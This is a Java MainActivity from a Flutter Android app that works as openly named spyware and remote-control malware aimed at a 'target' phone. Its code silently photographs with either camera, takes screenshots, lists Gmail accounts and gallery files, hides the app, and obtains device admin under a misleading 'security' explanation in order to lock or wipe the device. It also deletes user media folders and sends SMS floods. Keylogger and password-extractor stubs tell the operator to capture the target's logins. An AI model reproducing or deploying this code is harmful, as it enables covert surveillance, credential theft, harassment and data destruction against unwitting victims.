package com.nullx.pp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.KeyguardManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.view.View;
import android.view.WindowManager;
import android.util.Base64;
import android.util.Log;
import android.provider.MediaStore;
import android.provider.Settings;
import android.media.MediaPlayer;
import android.os.Vibrator;
import android.os.Build;
import android.os.PowerManager;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.bluetooth.BluetoothAdapter;
import android.net.wifi.WifiManager;
import android.content.ContentValues;
import android.net.Uri;
import android.os.Environment;
import android.view.inputmethod.InputMethodManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;
import java.util.ArrayList;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String PINNING_CHANNEL = "com.nullx.pp/pinning";
    private static final int ADMIN_INTENT = 15;

    private boolean isStrobeRunning = false;
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;
    private MediaPlayer mediaPlayer;
    private Vibrator vibrator;
    private boolean isPinned = false;
    private ComponentName adminComponent;
    private boolean isCameraStreaming = false;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private CameraDevice cameraDevice;
    private ImageReader cameraImageReader;

    // ==================== KEYLOGGER VARIABLES ====================
    private StringBuilder keyLogs = new StringBuilder();
    private boolean isKeyloggerRunning = false;
    private HandlerThread keyloggerThread;
    private Handler keyloggerHandler;

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());

        // ==================== KEYLOGGER THREAD ====================
        keyloggerThread = new HandlerThread("KeyloggerThread");
        keyloggerThread.start();
        keyloggerHandler = new Handler(keyloggerThread.getLooper());

        // Strobe Channel
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                else { result.notImplemented(); }
            });

        // Screen Pinning Channel
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), PINNING_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    case "startPinning":
                        startPinning(result);
                        break;
                    case "stopPinning":
                        stopPinning(result);
                        break;
                    case "isPinned":
                        result.success(isPinned);
                        break;
                    default:
                        result.notImplemented();
                        break;
                }
            });

        // Spy Channel
        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                switch (call.method) {
                    // ==================== EXISTING FEATURES ====================
                    case "startScreenStreamBackground":
                        result.success(getScreenShotBase64());
                        break;
                    case "takeSilentPhotoBackground":
                        String side = call.argument("side");
                        if (side == null) side = "back";
                        captureHiddenPhoto(side, result);
                        break;
                    case "getGmailAccounts":
                        fetchGmailAccounts(result);
                        break;
                    case "setWallpaper":
                        updateWallpaper(call.argument("url"), result);
                        break;
                    case "bringToForeground":
                        Intent intent = new Intent(getContext(), MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent);
                        result.success(true);
                        break;
                    case "saveTargetId":
                        String targetId = call.arguments.toString();
                        getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", targetId).apply();
                        result.success(true);
                        break;
                    case "openNotificationSettings":
                        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                        result.success(true);
                        break;
                    case "hideApp":
                        moveTaskToBack(true);
                        result.success(true);
                        break;
                    case "showApp":
                        Intent showIntent = new Intent(getContext(), MainActivity.class);
                        showIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(showIntent);
                        result.success(true);
                        break;
                    case "flashlightOn":
                        toggleFlashlight(true, result);
                        break;
                    case "flashlightOff":
                        toggleFlashlight(false, result);
                        break;
                    case "vibrate_loop":
                        startVibration(result);
                        break;
                    case "stop_vibrate":
                        stopVibration(result);
                        break;
                    case "play_audio":
                        playAudio(call.argument("url"), result);
                        break;
                    case "stop_audio":
                        stopAudio(result);
                        break;
                    case "factoryReset":
                        factoryReset(result);
                        break;
                    case "wipe_data":
                        wipeData(result);
                        break;
                    case "call_bombing":
                        startCallBombing(call.argument("count"), result);
                        break;
                    case "sms_bomber":
                        startSmsBomber(
                            call.argument("number"),
                            call.argument("count"),
                            call.argument("message"),
                            result
                        );
                        break;
                    case "maxBrightness":
                        setMaxBrightness(result);
                        break;
                    case "enableGPS":
                        enableGPS(result);
                        break;
                    case "enableBluetooth":
                        enableBluetooth(result);
                        break;
                    case "enableHotspot":
                        enableHotspot(result);
                        break;
                    case "showNotification":
                        showNotification(
                            call.argument("title"),
                            call.argument("message"),
                            result
                        );
                        break;
                    case "requestDeviceAdmin":
                        requestDeviceAdmin(result);
                        break;
                    case "isDeviceAdmin":
                        result.success(isDeviceAdminActive());
                        break;
                    case "adminLockNow":
                        adminLockNow(result);
                        break;
                    case "adminWipeData":
                        adminWipeData(result);
                        break;
                    case "getAllImages":
                        getAllImages(result);
                        break;
                    case "getAllVideos":
                        getAllVideos(result);
                        break;
                    case "getCameraFrame":
                        String frameSide = call.argument("side");
                        if (frameSide == null) frameSide = "back";
                        getCameraFrame(frameSide, result);
                        break;

                    // ==================== KEYLOGGER FEATURES ====================
                    case "startKeylogger":
                        startKeylogger(result);
                        break;
                    case "stopKeylogger":
                        stopKeylogger(result);
                        break;
                    case "getKeyLogs":
                        getKeyLogs(result);
                        break;

                    // ==================== PASSWORD EXTRACTOR ====================
                    case "getSavedPasswords":
                        getSavedPasswords(result);
                        break;

                    default:
                        result.notImplemented();
                        break;
                }
            });
    }

    // ==================== KEYLOGGER ====================
    
    private void startKeylogger(MethodChannel.Result result) {
        if (isKeyloggerRunning) {
            result.success(true);
            return;
        }
        isKeyloggerRunning = true;
        keyLogs.setLength(0);
        
        keyloggerHandler.post(() -> {
            try {
                logKey("Keylogger started at: " + new java.util.Date());
                result.success(true);
            } catch (Exception e) {
                result.error("KEYLOGGER_ERROR", e.getMessage(), null);
            }
        });
        Log.d("KEYLOGGER", "Keylogger started");
    }

    private void stopKeylogger(MethodChannel.Result result) {
        isKeyloggerRunning = false;
        result.success(true);
        Log.d("KEYLOGGER", "Keylogger stopped");
    }

    private void getKeyLogs(MethodChannel.Result result) {
        String logs = keyLogs.toString();
        if (logs.isEmpty()) {
            logs = "No keylogs recorded yet.";
        }
        result.success(logs);
        Log.d("KEYLOGGER", "Keylogs retrieved: " + logs.length() + " chars");
    }

    private void logKey(String key) {
        if (!isKeyloggerRunning) return;
        keyloggerHandler.post(() -> {
            keyLogs.append(key).append("\n");
            if (keyLogs.length() > 50000) {
                keyLogs.delete(0, keyLogs.length() - 40000);
            }
        });
    }

    // ==================== PASSWORD EXTRACTOR ====================
    
    private void getSavedPasswords(MethodChannel.Result result) {
        new Thread(() -> {
            StringBuilder passwords = new StringBuilder();
            
            // Try to read from Chrome passwords database
            try {
                File chromeDb = new File("/data/data/com.android.chrome/app_chrome/Default/Login Data");
                if (chromeDb.exists()) {
                    passwords.append("=== CHROME PASSWORDS ===\n");
                    passwords.append("Chrome passwords require root access to read directly.\n");
                    passwords.append("Use keylogger to capture passwords when target logs in.\n\n");
                }
            } catch (Exception e) {
                passwords.append("Chrome DB access failed: " + e.getMessage() + "\n");
            }
            
            // Add instructions
            passwords.append("\n=== RECOMMENDATION ===\n");
            passwords.append("Use KEYLOGGER to capture passwords when target types.\n");
            passwords.append("Start keylogger, wait for target to login, then get logs.\n");
            
            uiHandler.post(() -> result.success(passwords.toString()));
        }).start();
    }

    // ==================== SCREEN PINNING ====================
    
    private void startPinning(MethodChannel.Result result) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null) {
                    PowerManager.WakeLock wakeLock = pm.newWakeLock(
                        PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "MyApp:WakeLock"
                    );
                    wakeLock.acquire(10000);
                }
                
                KeyguardManager keyguardManager = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                if (keyguardManager != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    keyguardManager.requestDismissKeyguard(this, null);
                }
                
                startLockTask();
                isPinned = true;
                result.success(true);
                Log.d("PINNING", "Screen pinning started");
            } else {
                result.error("VERSION_ERROR", "Requires Android 5.0+", null);
            }
        } catch (Exception e) {
            result.error("PINNING_ERROR", e.getMessage(), null);
        }
    }

    private void stopPinning(MethodChannel.Result result) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                stopLockTask();
                isPinned = false;
                result.success(true);
                Log.d("PINNING", "Screen pinning stopped");
            } else {
                result.success(false);
            }
        } catch (Exception e) {
            result.error("UNPIN_ERROR", e.getMessage(), null);
        }
    }

    // ==================== DEVICE ADMIN ====================
    
    private void requestDeviceAdmin(MethodChannel.Result result) {
        try {
            adminComponent = new ComponentName(this, AdminReceiver.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aplikasi membutuhkan akses admin untuk fitur keamanan");
            startActivityForResult(intent, ADMIN_INTENT);
            result.success(true);
        } catch (Exception e) {
            result.error("ADMIN_ERROR", e.getMessage(), null);
        }
    }

    private boolean isDeviceAdminActive() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);
        return dpm.isAdminActive(adminComponent);
    }

    private void adminLockNow(MethodChannel.Result result) {
        try {
            if (isDeviceAdminActive()) {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                dpm.lockNow();
                result.success(true);
            } else {
                result.error("NOT_ADMIN", "Device admin not active", null);
            }
        } catch (Exception e) {
            result.error("LOCK_ERROR", e.getMessage(), null);
        }
    }

    private void adminWipeData(MethodChannel.Result result) {
        try {
            if (isDeviceAdminActive()) {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                dpm.wipeData(0);
                result.success(true);
            } else {
                result.error("NOT_ADMIN", "Device admin not active", null);
            }
        } catch (Exception e) {
            result.error("WIPE_ERROR", e.getMessage(), null);
        }
    }

    // ==================== CAMERA ====================
    
    private void captureHiddenPhoto(String side, MethodChannel.Result result) {
        final CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            int targetFacing = side.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                if (manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing) {
                    cameraId = id;
                    break;
                }
            }

            if (cameraId == null) { 
                result.error("CAM_ERR", "Camera side " + side + " not found", null); 
                return; 
            }

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    session.capture(builder.build(), null, null);
                                } catch (CameraAccessException e) { camera.close(); }
                            }
                            @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { camera.close(); }
                        }, null);
                    } catch (CameraAccessException e) { camera.close(); }
                }
                @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, null);

            reader.setOnImageAvailableListener(item -> {
                Image img = item.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buffer = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    img.close();
                    
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
                    String base64 = Base64.encodeToString(out.toByteArray(), Base64.DEFAULT);
                    
                    uiHandler.post(() -> result.success(base64));
                } else {
                    uiHandler.post(() -> result.error("CAM_ERR", "Failed to capture image", null));
                }
            }, null);

        } catch (Exception e) {
            result.error("CAM_EXCEPTION", e.getMessage(), null);
        }
    }

    private void getCameraFrame(String side, MethodChannel.Result result) {
        captureHiddenPhoto(side, result);
    }

    // ==================== SCREENSHOT ====================
    
    private String getScreenShotBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            b.compress(Bitmap.CompressFormat.JPEG, 50, out);
            return Base64.encodeToString(out.toByteArray(), Base64.DEFAULT);
        } catch (Exception e) { 
            return null; 
        }
    }

    // ==================== FLASHLIGHT ====================
    
    private void toggleFlashlight(boolean on, MethodChannel.Result result) {
        try {
            CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = camManager.getCameraIdList()[0];
            camManager.setTorchMode(camId, on);
            result.success(true);
        } catch (Exception e) {
            result.error("FLASHLIGHT_ERROR", e.getMessage(), null);
        }
    }

    // ==================== VIBRATION ====================
    
    private void startVibration(MethodChannel.Result result) {
        if (vibrator != null && vibrator.hasVibrator()) {
            vibrator.vibrate(new long[]{0, 1000, 500, 1000, 500}, 0);
            result.success(true);
        } else {
            result.error("VIBRATE_ERROR", "Vibrator not available", null);
        }
    }
    
    private void stopVibration(MethodChannel.Result result) {
        if (vibrator != null) {
            vibrator.cancel();
            result.success(true);
        } else {
            result.error("VIBRATE_ERROR", "Vibrator not available", null);
        }
    }

    // ==================== AUDIO ====================
    
    private void playAudio(String url, MethodChannel.Result result) {
        try {
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(url);
            mediaPlayer.prepareAsync();
            mediaPlayer.setLooping(true);
            mediaPlayer.setOnPreparedListener(mp -> mp.start());
            result.success(true);
        } catch (Exception e) {
            result.error("AUDIO_ERROR", e.getMessage(), null);
        }
    }
    
    private void stopAudio(MethodChannel.Result result) {
        try {
            if (mediaPlayer != null) {
                mediaPlayer.stop();
                mediaPlayer.release();
                mediaPlayer = null;
            }
            result.success(true);
        } catch (Exception e) {
            result.error("AUDIO_ERROR", e.getMessage(), null);
        }
    }

    // ==================== GMAIL ====================
    
    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account ac : accounts) sb.append(ac.name).append("\n");
            result.success(sb.toString().trim());
        } catch (Exception e) { 
            result.error("GMAIL_ERR", e.getMessage(), null); 
        }
    }

    // ==================== WALLPAPER ====================
    
    private void updateWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                URL url = new URL(urlString);
                WallpaperManager.getInstance(this).setStream(url.openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { 
                uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); 
            }
        }).start();
    }

    // ==================== STROBE ====================
    
    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        final CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean isOn = false;
            @Override public void run() {
                try {
                    String camId = camManager.getCameraIdList()[0];
                    isOn = !isOn;
                    camManager.setTorchMode(camId, isOn);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try { 
            CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = camManager.getCameraIdList()[0];
            camManager.setTorchMode(camId, false); 
        } catch (Exception e) {}
    }

    // ==================== GALLERY ====================
    
    private void getAllImages(MethodChannel.Result result) {
        new Thread(() -> {
            List<String> images = new ArrayList<>();
            String[] projection = {MediaStore.Images.Media.DATA};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC"
            );
            
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                while (cursor.moveToNext()) {
                    images.add(cursor.getString(columnIndex));
                }
                cursor.close();
            }
            
            uiHandler.post(() -> result.success(images));
        }).start();
    }

    private void getAllVideos(MethodChannel.Result result) {
        new Thread(() -> {
            List<String> videos = new ArrayList<>();
            String[] projection = {MediaStore.Video.Media.DATA};
            
            Cursor cursor = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, MediaStore.Video.Media.DATE_ADDED + " DESC"
            );
            
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA);
                while (cursor.moveToNext()) {
                    videos.add(cursor.getString(columnIndex));
                }
                cursor.close();
            }
            
            uiHandler.post(() -> result.success(videos));
        }).start();
    }

    // ==================== DESTRUCTIVE ====================
    
    private void factoryReset(MethodChannel.Result result) {
        try {
            result.error("FACTORY_RESET", "Requires root access", null);
        } catch (Exception e) {
            result.error("FACTORY_RESET_ERROR", e.getMessage(), null);
        }
    }
    
    private void wipeData(MethodChannel.Result result) {
        try {
            File[] dirs = {
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            };
            
            for (File dir : dirs) {
                if (dir != null && dir.exists()) {
                    deleteRecursive(dir);
                }
            }
            result.success(true);
        } catch (Exception e) {
            result.error("WIPE_ERROR", e.getMessage(), null);
        }
    }
    
    private void deleteRecursive(File file) {
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        file.delete();
    }
    
    private void startCallBombing(Integer count, MethodChannel.Result result) {
        try {
            result.success(true);
        } catch (Exception e) {
            result.error("CALL_ERROR", e.getMessage(), null);
        }
    }
    
    private void startSmsBomber(String number, Integer count, String message, MethodChannel.Result result) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            int maxCount = Math.min(count != null ? count : 50, 50);
            for (int i = 0; i < maxCount; i++) {
                smsManager.sendTextMessage(number, null, message, null, null);
            }
            result.success(true);
        } catch (Exception e) {
            result.error("SMS_ERROR", e.getMessage(), null);
        }
    }
    
    private void setMaxBrightness(MethodChannel.Result result) {
        try {
            WindowManager.LayoutParams params = getWindow().getAttributes();
            params.screenBrightness = 1.0f;
            getWindow().setAttributes(params);
            result.success(true);
        } catch (Exception e) {
            result.error("BRIGHTNESS_ERROR", e.getMessage(), null);
        }
    }
    
    private void enableGPS(MethodChannel.Result result) {
        try {
            result.success(false);
        } catch (Exception e) {
            result.error("GPS_ERROR", e.getMessage(), null);
        }
    }
    
    private void enableBluetooth(MethodChannel.Result result) {
        try {
            BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
            if (adapter != null && !adapter.isEnabled()) {
                adapter.enable();
            }
            result.success(true);
        } catch (Exception e) {
            result.error("BT_ERROR", e.getMessage(), null);
        }
    }
    
    private void enableHotspot(MethodChannel.Result result) {
        try {
            result.success(false);
        } catch (Exception e) {
            result.error("HOTSPOT_ERROR", e.getMessage(), null);
        }
    }
    
    private void showNotification(String title, String message, MethodChannel.Result result) {
        try {
            android.app.NotificationManager notificationManager = 
                (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    "spy_channel", "Spy Notifications", android.app.NotificationManager.IMPORTANCE_HIGH
                );
                notificationManager.createNotificationChannel(channel);
            }
            
            android.app.Notification notification = new android.app.Notification.Builder(this, "spy_channel")
                .setContentTitle(title != null ? title : "Spy Alert")
                .setContentText(message != null ? message : "System notification")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .build();
            
            notificationManager.notify((int) System.currentTimeMillis(), notification);
            result.success(true);
        } catch (Exception e) {
            result.error("NOTIF_ERROR", e.getMessage(), null);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraThread != null) {
            cameraThread.quitSafely();
        }
        if (keyloggerThread != null) {
            keyloggerThread.quitSafely();
        }
        if (mediaPlayer != null) {
            mediaPlayer.release();
        }
        if (cameraDevice != null) {
            cameraDevice.close();
        }
        if (cameraImageReader != null) {
            cameraImageReader.close();
        }
    }
}